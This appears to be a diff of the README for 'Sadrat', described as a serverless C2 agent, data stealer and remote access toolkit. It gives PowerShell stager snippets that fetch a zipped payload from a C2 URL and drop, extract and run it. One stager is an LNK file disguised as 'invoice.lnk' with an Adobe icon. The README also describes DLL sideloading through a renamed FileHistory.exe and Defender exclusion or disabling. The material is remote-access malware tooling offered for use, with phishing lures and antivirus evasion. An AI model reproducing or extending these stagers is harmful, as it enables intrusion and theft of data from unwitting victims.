@@ -1,13 +1,13 @@
 ## Sadrat
 
-##### Serverless C2 Agent, Datastealer and Remote Access Toolkit
+### Serverless C2 Agent, Datastealer and Remote Access Toolkit
 
 #### Stagers
 Zip up the .exe.config, dll and sideloading exe and base64.exe -n 0 -i then upload it into the module repo. Provide the url, stagers will decode and drop, extract, execute. 
 
 ##### LnkGen.ps1 - Generate a LNK Stager
 ```powershell
-$url = "https://c2.server.com/api/assets/fhZip"
+$url = "https://c2.serverless.com/api/assets/fhZip"
 $zipName = "fh.zip"
 $exeName = "FileHistory.exe"
 $lnkPath = ".\invoice.lnk"
@@ -18,7 +18,7 @@ $iconPath = ".\adobe.png"
 
 ##### SimpleStager - Drops to current Folder 
 ```powershell
-$url = "https://c2.server.com/api/assets/fhZip"
+$url = "https://c2.serverless.com/api/assets/fhZip"
 $zipName = "fh.zip"
 $exeName = "FileHistory.exe"
 
@@ -27,7 +27,7 @@ $exeName = "FileHistory.exe"
 
 ##### Stager.ps1 - Admin checks for install paths and optionally defender exlucsions/disabling
 ```powershell
-$url = "https://c2.server.com/api/assets/fhZip"
+$url = "https://c2.serverless.com/api/assets/fhZip"
 $zipName = "fh.zip"
 $exeName = "FileHistory.exe"
 
